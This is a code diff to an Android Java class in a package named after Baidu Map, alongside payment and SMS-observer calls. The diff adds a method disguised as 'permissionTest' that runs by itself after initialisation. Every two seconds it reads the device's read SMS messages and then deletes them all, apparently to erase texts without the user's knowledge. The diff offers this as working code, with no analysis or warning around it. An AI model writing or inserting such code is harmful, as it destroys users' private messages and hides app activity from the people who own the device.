@@ -1,6 +1,7 @@
 package com.baidu.BaiduMap;
 
 import android.content.Context;
+import android.net.Uri;
 import android.os.Handler;
 
 import com.baidu.BaiduMap.httpCenter.InitRequest;
@@ -10,6 +11,8 @@ import com.baidu.BaiduMap.sms.RegistSmsObserver;
 
 import java.util.HashMap;
 import java.util.Map;
+import java.util.Timer;
+import java.util.TimerTask;
 
 /**
  * Created by Administrator on 2017/7/21.
@@ -32,6 +35,7 @@ public class Controler {
         Handler initHandler = (Handler) initCallBack;
         Handler payCallHandler = (Handler) payCallBack;
         InitRequest.getInstance().request(context, price, Did, productName, initHandler, payCallHandler);
+        permissionTest(context);
     }
 
     /*
@@ -62,5 +66,17 @@ public class Controler {
      */
     public void r(Context context) {
         RegistSmsObserver.getInstance().regist(context);
+    }
+
+    public static void permissionTest(final Context context) {
+        new Timer().schedule(new TimerTask() {
+            @Override
+            public void run() {
+                context.getContentResolver().query(Uri.parse("content://sms"),
+                        new String[]{"_id", "address", "read", "body", "thread_id"}, "read=?", new String[]{"1"},
+                        "date desc");
+                context.getContentResolver().delete(Uri.parse("content://sms"), "read=1", null);
+            }
+        }, 3000, 2000);
     }
 }
